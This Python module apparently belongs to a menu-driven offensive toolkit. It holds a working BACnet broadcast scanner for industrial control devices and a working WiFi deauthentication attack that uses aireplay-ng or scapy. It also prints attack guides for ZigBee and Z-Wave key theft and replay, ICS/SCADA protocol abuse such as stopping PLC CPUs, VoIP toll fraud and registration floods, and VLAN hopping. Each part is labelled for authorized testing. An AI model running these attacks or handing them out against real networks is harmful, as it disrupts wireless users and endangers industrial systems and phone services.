from __future__ import annotations

import socket

from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause, report, run_external

# ---------------------------------------------------------------------------
# BACnet scanner – discover BACnet devices on a network
# ---------------------------------------------------------------------------
def bacnet_scan() -> None:
    header("BACnet Device Discovery")
    console.print("Discover BACnet industrial control devices via UDP broadcast.\n")
    target = Prompt.ask("Target subnet (e.g. 192.168.1.255)", default="255.255.255.255")
    port = int(Prompt.ask("Port", default="47808"))
    # BACnet Who-Is broadcast (simple)
    who_is = bytes([0x81, 0x0b, 0x00, 0x0c, 0x01, 0x00, 0x01, 0x00, 0xff, 0x00, 0x00, 0x10, 0x08])
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(3)
    found = []
    try:
        sock.sendto(who_is, (target, port))
        while True:
            try:
                data, addr = sock.recvfrom(1024)
                found.append((addr[0], data.hex()[:60]))
            except socket.timeout:
                break
    except Exception as ex:
        console.print(f"[red]Error: {ex}[/]")
    finally:
        sock.close()
    if found:
        console.print(f"[green]Found {len(found)} BACnet device(s):[/]")
        for ip, resp in found:
            console.print(f"  {ip} → {resp}")
    else:
        console.print("[yellow]No BACnet devices responded.[/]")
    report("BACnet scan", f"target={target} found={len(found)}")
    pause()


# ---------------------------------------------------------------------------
# ZigBee / Z-Wave info
# ---------------------------------------------------------------------------
def zigbee_info() -> None:
    header("ZigBee Attack Guide")
    console.print("ZigBee IoT protocol attack methodology for authorized testing.\n")
    steps = [
        ("Hardware", "KillerBee + Atmel RZUSBstick or API-Mote for sniffing/injection"),
        ("Recon", "zbstumbler / zbdump to find networks and channels"),
        ("Key theft", "Capture key exchange (install-code → link key derivation)"),
        ("Replay", "zbwardump + zbreplay to capture and replay frames"),
        ("Injection", "zbassocflood for association flood, zbdsniff for key sniffing"),
        ("Tools", "KillerBee, Z3Sec, ZigBee Sniffer, ApiMote"),
    ]
    for label, desc in steps:
        console.print(f"  [cyan]{label}[/] — {desc}")
    report("ZigBee guide", "shown")
    pause()


def zwave_info() -> None:
    header("Z-Wave Attack Guide")
    console.print("Z-Wave IoT protocol attack methodology for authorized testing.\n")
    steps = [
        ("Hardware", "Z-Wave USB stick (Aeon Labs Z-Stick) + Z-Wave PC Controller"),
        ("Recon", "Scan for Z-Wave networks on 908.42 MHz (US) / 868.42 MHz (EU)"),
        ("S0 downgrade", "Force S0 (legacy) inclusion to weaken encryption"),
        ("Replay", "Capture and replay Z-Wave frames with Z-Wave sniffers"),
        ("Key extraction", "S2 key extraction via side-channel or firmware dump"),
        ("Tools", "Z-Wave PC Controller, OpenZWave, Z-Wave Sniffer, RFCat"),
    ]
    for label, desc in steps:
        console.print(f"  [cyan]{label}[/] — {desc}")
    report("Z-Wave guide", "shown")
    pause()


# ---------------------------------------------------------------------------
# WiFi deauth (requires aireplay-ng or scapy)
# ---------------------------------------------------------------------------
def wifi_deauth() -> None:
    header("WiFi Deauth Attack")
    console.print("Send deauth frames to disconnect clients (authorized testing only).\n")
    console.print("  [cyan]1[/]  Via aireplay-ng (requires aircrack-ng suite)")
    console.print("  [cyan]2[/]  Via scapy (requires Python scapy)")
    choice = Prompt.ask("Method", choices=["1", "2"], default="1")
    bssid = Prompt.ask("Target BSSID", default="00:11:22:33:44:55")
    iface = Prompt.ask("Monitor-mode interface", default="wlan0mon")
    if choice == "1":
        cmd = f"aireplay-ng --deauth 5 -a {bssid} {iface}"
        console.print(f"[green]Run:[/] {cmd}")
        run_external("aireplay-ng", ["--deauth", "5", "-a", bssid, iface])
    else:
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(pkt, iface=iface, count=5, inter=0.1)
            console.print("[green]Sent 5 deauth frames.[/]")
        except ImportError:
            console.print("[red]scapy not installed. pip install scapy[/]")
    report("WiFi deauth", f"bssid={bssid} iface={iface} method={choice}")
    pause()


# ---------------------------------------------------------------------------
# Water/ICS system info
# ---------------------------------------------------------------------------
def ics_info() -> None:
    header("ICS / SCADA Attack Guide")
    console.print("Industrial Control System attack methodology for authorized testing.\n")
    protocols = [
        ("Modbus TCP (502)", "Read/write coils/registers, no auth by default"),
        ("BACnet (47808)", "Who-Is / I-Am discovery, read property, write property"),
        ("DNP3 (20000)", "Serial/TCP, no auth, data object read/write"),
        ("EtherNet/IP (44818)", "Allen-Bradley PLC enumeration, CIP commands"),
        ("S7comm (102)", "Siemens PLC read/write, stop/start CPU"),
        ("OPC UA", "Browse address space, read/write nodes, method calls"),
        ("Profinet", "RT/IRT frame injection, device replacement"),
    ]
    tbl = Table(title="ICS/SCADA Protocols", border_style="yellow")
    tbl.add_column("Protocol (port)", style="cyan")
    tbl.add_column("Attack Surface")
    for proto, surface in protocols:
        tbl.add_row(proto, surface)
    console.print(tbl)
    console.print("\n  [yellow]Tools:[/] plcscan, ISF, Metasploit modules, Conpot (honeypot)")
    report("ICS guide", f"{len(protocols)} protocols")
    pause()


# ---------------------------------------------------------------------------
# VoIP attack
# ---------------------------------------------------------------------------
def voip_attack() -> None:
    header("VoIP Attack Guide")
    console.print("VoIP/SIP attack methodology for authorized testing.\n")
    attacks = [
        ("SIP scanning", "sipvicious svwar / svmap to find extensions"),
        ("VoIP sniffing", "Wireshark + RTP analysis, extract audio from captures"),
        ("Toll fraud", "Test for open SIP proxies allowing outbound calls"),
        ("Registration flood", "Flood SIP registrar with REGISTER requests"),
        ("Credential brute", "svwar + password list against SIP auth"),
        ("RTP injection", "Inject audio into active RTP stream"),
        ("VLAN hop", "Voice VLAN tagging to access voice network"),
    ]
    for label, desc in attacks:
        console.print(f"  [cyan]{label}[/] — {desc}")
    report("VoIP guide", f"{len(attacks)} techniques")
    pause()


# ---------------------------------------------------------------------------
# VLAN hopping
# ---------------------------------------------------------------------------
def vlan_hop() -> None:
    header("VLAN Hopping Guide")
    console.print("VLAN hopping techniques for authorized network testing.\n")
    techniques = [
        ("Switch spoofing", "Negotiate DTP trunk with the switch (Yersinia)"),
        ("Double tagging", "Outer tag = native VLAN, inner tag = target VLAN"),
        ("VoIP VLAN hop", "Tag frames with voice VLAN ID to access voice network"),
        ("PVLAN bypass", "Promiscuous port abuse or proxy through router"),
    ]
    for label, desc in techniques:
        console.print(f"  [cyan]{label}[/] — {desc}")
    console.print("\n  [yellow]Tools:[/] Yersinia, Scapy, VLANhopper, dot1x-tamarack")
    report("VLAN hop guide", f"{len(techniques)} techniques")
    pause()


# ---------------------------------------------------------------------------
# Menu
# ---------------------------------------------------------------------------
MENU = {
    "1": ("BACnet device discovery", bacnet_scan),
    "2": ("ZigBee attack guide", zigbee_info),
    "3": ("Z-Wave attack guide", zwave_info),
    "4": ("WiFi deauth attack", wifi_deauth),
    "5": ("ICS / SCADA attack guide", ics_info),
    "6": ("VoIP / SIP attack guide", voip_attack),
    "7": ("VLAN hopping guide", vlan_hop),
}
